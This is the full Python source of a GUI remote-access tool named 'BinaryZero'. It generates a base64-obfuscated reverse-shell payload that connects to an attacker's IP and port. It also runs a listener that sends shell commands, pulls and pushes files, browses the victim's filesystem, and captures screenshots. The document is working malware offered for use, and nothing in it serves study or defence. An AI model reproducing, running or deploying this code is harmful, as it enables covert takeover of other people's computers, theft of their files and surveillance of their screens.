# gui_metasploit.py
import tkinter as tk
import base64
from tkinter import messagebox, scrolledtext
from tkinter import filedialog
from tkinter import ttk


import threading
import socket
import os

clients = []
current_path = "~"

if not os.path.exists("downloads"):
    os.makedirs("downloads")

def create_payload(attacker_ip, port, default_filename):
    try:
        # Default directory is ~/Documents
        default_dir = os.path.join(os.path.expanduser("~"), "Documents")
        if not os.path.exists(default_dir):
            default_dir = os.path.expanduser("~")  # fallback to home dir

        filepath = filedialog.asksaveasfilename(
            initialdir=default_dir,
            initialfile=default_filename,
            title="Save Payload As",
            defaultextension=".py",
            filetypes=[("Python Files", "*.py"), ("All Files", "*.*")]
        )

        if not filepath:
            return  # User cancelled

        raw_payload = f"""
import socket
import subprocess
import os

def connect():
    s = socket.socket()
    s.connect(("{attacker_ip}", {port}))
    while True:
        try:
            cmd = s.recv(1024).decode()
            if cmd.startswith("download "):
                filepath = os.path.expanduser(cmd.split(" ", 1)[1])
                if os.path.exists(filepath):
                    with open(filepath, "rb") as f:
                        while True:
                            data = f.read(1024)
                            if not data:
                                break
                            s.send(data)
                    s.send(b"<END>")
                else:
                    s.send(b"File not found<END>")
                continue
            elif cmd.startswith("upload "):
                filepath = os.path.expanduser(cmd.split(" ", 1)[1])
                with open(filepath, "wb") as f:
                    while True:
                        data = s.recv(1024)
                        if b"<END>" in data:
                            end_index = data.find(b"<END>")
                            f.write(data[:end_index])
                            break
                        f.write(data)
                continue
            elif cmd == "screenshot":
                try:
                    import pyautogui
                    import io
                    img_bytes = io.BytesIO()
                    screenshot = pyautogui.screenshot()
                    screenshot.save(img_bytes, format="PNG")
                    s.sendall(img_bytes.getvalue() + b"<END>")  # ✔ attach END marker here
                except Exception as e:
                    s.send(f"Failed to take screenshot: {{e}}<END>".encode())
                continue
            output = subprocess.getoutput(cmd)
            if output == "":
                output = "[+] Command executed."
            s.send(output.encode())
        except:
            break

connect()
"""

        encoded = base64.b64encode(raw_payload.encode()).decode()

        obfuscated_code = f'''
import base64
exec(base64.b64decode(b"""{encoded}"""))
        '''

        with open(filepath, "w") as f:
            f.write(obfuscated_code.strip())
        messagebox.showinfo("Payload Created", f"Payload saved as:\n{filepath}")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to create payload:\n{e}")


def handle_client(conn, addr):
    clients.append(conn)
    output_box.insert(tk.END, f"[+] Connected: {addr}\n")
    output_box.see(tk.END)

    # Schedule directory listing from the GUI thread
    def delayed_directory_list():
        list_directory("~")
    
    app.after(1000, delayed_directory_list)

def start_listener(ip, port):
    try:
        s = socket.socket()
        s.bind((ip, int(port)))
        s.listen(5)
        output_box.insert(tk.END, f"[+] Listening on {ip}:{port}...\n")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
    except Exception as e:
        output_box.insert(tk.END, f"[-] Listener failed: {e}\n")
        messagebox.showerror("Listener Error", str(e))

def list_directory(path=None):
    global current_path
    if not clients:
        return
    client = clients[0]
    if path:
        current_path = path
    try:
        client.send(f"ls -p {current_path}".encode())
        data = client.recv(8192).decode(errors="ignore")
        items = data.splitlines()
        file_tree.delete(*file_tree.get_children())
        for item in items:
            full_path = os.path.join(current_path, item)
            if item.endswith("/"):
                file_tree.insert("", "end", text=item[:-1], values=(full_path, "folder"))
            else:
                file_tree.insert("", "end", text=item, values=(full_path, "file"))
    except Exception as e:
        output_box.insert(tk.END, f"[-] Failed to list: {e}\n")

def go_back():
    global current_path
    if current_path in ["~", "/", ""]:
        return
    parent_path = os.path.dirname(current_path.rstrip("/"))
    if not parent_path:
        parent_path = "/"
    list_directory(parent_path)

def on_tree_click(event):
    selected = file_tree.focus()
    if not selected:
        return
    item = file_tree.item(selected)
    full_path, ftype = item["values"]
    if ftype == "folder":
        list_directory(full_path)
    elif ftype == "file":
        command_entry.delete(0, tk.END)
        command_entry.insert(0, f"download {full_path}")
        threading.Thread(target=send_command, daemon=True).start()

def send_command():
    cmd = command_entry.get()
    if not cmd or not clients:
        return

    disconnected_clients = []

    for client in clients:
        try:
            if cmd.startswith("download "):
                filename = cmd.split(" ", 1)[1]
                client.send(cmd.encode())

                save_dir = os.path.join(os.path.expanduser("~"), "Downloads")
                if not os.path.exists(save_dir):
                    os.makedirs(save_dir)
                save_path = os.path.join(save_dir, os.path.basename(filename))

                # Receive full file into buffer
                buffer = b""
                while True:
                    data = client.recv(4096)
                    if not data:
                        raise ConnectionError("Client disconnected during download")
                    buffer += data
                    if b"<END>" in buffer:
                        parts = buffer.split(b"<END>")
                        with open(save_path, "wb") as f:
                            f.write(parts[0])
                        break

                output_box.insert(tk.END, f"[+] File downloaded to: {save_path}\n")

            else:
                client.send(cmd.encode())
                data = client.recv(4096)
                try:
                    output = data.decode()
                except UnicodeDecodeError:
                    output = "[!] Received non-text output."
                output_box.insert(tk.END, f"{output}\n")

        except Exception as e:
            output_box.insert(tk.END, f"[-] Failed to send command: {e}\n")
            disconnected_clients.append(client)

    for dc in disconnected_clients:
        try:
            clients.remove(dc)
            dc.close()
        except:
            pass

    command_entry.delete(0, tk.END)



def upload_file():
    if not clients:
        return

    client = clients[0]

    local_path = filedialog.askopenfilename(title="Select File to Upload")
    if not local_path:
        return

    remote_filename = os.path.basename(local_path)
    remote_path = os.path.join(current_path, remote_filename)

    try:
        client.send(f"upload {remote_path}".encode())

        with open(local_path, "rb") as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                client.send(data)
        client.send(b"<END>")
        output_box.insert(tk.END, f"[+] Uploaded to: {remote_path}\n")
    except Exception as e:
        output_box.insert(tk.END, f"[-] Upload failed: {e}\n")

def take_screenshot():
    if not clients:
        output_box.insert(tk.END, "[-] No client connected.\n")
        return

    client = clients[0]
    try:
        client.send(b"screenshot")

        save_dir = os.path.join(os.path.expanduser("~"), "Downloads")
        os.makedirs(save_dir, exist_ok=True)
        save_path = os.path.join(save_dir, "screenshot.png")

        buffer = b""
        while True:
            data = client.recv(4096)
            if not data:
                raise ConnectionError("Client disconnected during screenshot")
            buffer += data
            if b"<END>" in buffer:
                buffer = buffer.split(b"<END>")[0]
                break

        with open(save_path, "wb") as f:
            f.write(buffer)

        output_box.insert(tk.END, f"[+] Screenshot saved to: {save_path}\n")

        # Open image (cross-platform)
        import platform
        system = platform.system()
        if system == "Windows":
            os.startfile(save_path)
        elif system == "Darwin":
            os.system(f"open '{save_path}'")
        else:
            os.system(f"xdg-open '{save_path}'")

    except Exception as e:
        output_box.insert(tk.END, f"[-] Screenshot failed: {e}\n")




# ------------------ GUI Layout ------------------
app = tk.Tk()
app.title("BinaryZero")
app.geometry("1000x600")

main_frame = tk.Frame(app)
main_frame.pack(fill="both", expand=True)

left_frame = tk.Frame(main_frame, width=500)
left_frame.pack(side="left", fill="both", expand=True)

right_frame = tk.Frame(main_frame, width=500, bg="#282828")
right_frame.pack(side="right", fill="both", expand=True)

# Left - Controls and Shell
tk.Label(left_frame, text="Attacker IP:").pack()
ip_entry = tk.Entry(left_frame)
ip_entry.insert(0, "127.0.0.1")
ip_entry.pack()

tk.Label(left_frame, text="Port:").pack()
port_entry = tk.Entry(left_frame)
port_entry.insert(0, "4444")
port_entry.pack()

tk.Label(left_frame, text="Payload filename (.py):").pack()
filename_entry = tk.Entry(left_frame)
filename_entry.insert(0, "reverse_payload.py")
filename_entry.pack()

tk.Button(left_frame, text="Create Payload", command=lambda: create_payload(ip_entry.get(), port_entry.get(), filename_entry.get())).pack(pady=5)
tk.Button(left_frame, text="Start Listener", command=lambda: threading.Thread(target=start_listener, args=(ip_entry.get(), port_entry.get()), daemon=True).start()).pack()

tk.Label(left_frame, text="Shell Command:").pack()
command_entry = tk.Entry(left_frame, width=50)
command_entry.pack(pady=5)
tk.Button(left_frame, text="Send Command", command=lambda: threading.Thread(target=send_command, daemon=True).start()).pack()

tk.Label(left_frame, text="Console Output:").pack()
output_box = scrolledtext.ScrolledText(left_frame, width=60, height=20)
output_box.pack(pady=10)

tk.Button(left_frame, text="Exit", command=app.quit).pack(pady=5)

# Right - File Browser
tk.Label(right_frame, text="Remote File Browser:", bg="#282828", fg="white").pack()
back_btn = tk.Button(right_frame, text="⬅️ Back", command=go_back)
back_btn.pack(pady=5)

file_tree = ttk.Treeview(right_frame)
file_tree.pack(pady=5, fill="both", expand=True)
file_tree.bind("<Double-1>", on_tree_click)



app.mainloop()


